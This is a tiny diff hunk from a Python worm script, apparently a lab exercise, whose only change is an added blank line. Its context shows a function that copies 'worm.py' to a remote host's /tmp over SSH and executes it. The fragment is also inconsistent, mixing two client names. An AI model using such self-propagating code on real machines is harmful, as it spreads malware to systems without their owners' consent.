@@ -69,6 +69,7 @@ def spreadAndExecute(sshClient):
 	# The code which goes into this function
 	# is very similar to that code.	
 	sshClient.put("worm.py","/tmp/"+"worm.py")
+
 	ssh.exec_command("python /tmp/worm.py")
 
 	pass
